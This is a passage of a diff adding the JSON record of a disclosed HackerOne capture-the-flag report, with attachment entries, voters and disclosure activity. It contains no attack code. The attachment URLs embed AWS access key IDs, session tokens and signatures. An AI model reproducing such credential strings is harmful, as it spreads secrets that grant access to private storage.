QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=98c9c49c4bb0bc1de717c6625aa0d72f43d718398594a7bc31ea35ef730d3033",
+      "file_size": 413924,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 438211,
+      "file_name": "img-tag-in.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/211/7e1a7d51be6125febb26d298a7175910d8a9d8b5/img-tag-in.png?response-content-disposition=attachment%3B%20filename%3D%22img-tag-in.png%22%3B%20filename%2A%3DUTF-8%27%27img-tag-in.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074422Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b5510ac44c994cea126dca31c081ad8d99c73ade15b14ed7b966d188b9bb71a",
+      "file_size": 461899,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 438212,
+      "file_name": "filter-bypass.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/212/f1e8f56a26606bab5e2cc9ccdbf48bfa8eba483f/filter-bypass.png?response-content-disposition=attachment%3B%20filename%3D%22filter-bypass.png%22%3B%20filename%2A%3DUTF-8%27%27filter-bypass.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074422Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6d6ba82301272fd3e46ed4294394aece68845d751c546015045dfa4c9efb79ee",
+      "file_size": 482927,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-05-08T15:54:04.302Z",
+  "allow_singular_disclosure_after": -138124217.97607633,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "nytr0gen",
+    "checkm50",
+    "ali",
+    "mik317",
+    "f_m",
+    "magic_spell",
+    "sinswriter",
+    "beamjack",
+    "sorted_one",
+    "1a2b3c4d5e6f7g8h9i1a2b3c4d5e6f",
+    "and 3 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 4492853,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.",
+      "automated_response": false,
+      "created_at": "2019-04-05T18:34:57.882Z",
+      "updated_at": "2019-04-05T18:34:57.882Z",
+      "actor": {
+        "username": "daeken",
+        "cleared": false,
+        "verified": false,
+        "url": "/daeken",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "lucio",
+        "url": "/lucio"
+      },
+      "genius_execution_id": null,
+      "team_handle": "50m-ctf"
+    },
+    {
+      "id": 4509074,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-04-08T15:54:04.172Z",
+      "updated_at": "2019-04-08T15:54:04.172Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "daeken",
+        "cleared": false,
+        "verified": false,
+        "url": "/daeken",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "50m-ctf"
+    },
+    {
+      "id": 4509076,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-04-08T15:54:14.960Z",
+      "updated_at": "2019-04-08T15:54:14.960Z",
+      "actor": {
+        "username": "daeken",
+        "cleared": false,
+        "verified": false,
+        "url": "/daeken",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "50m-ctf"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
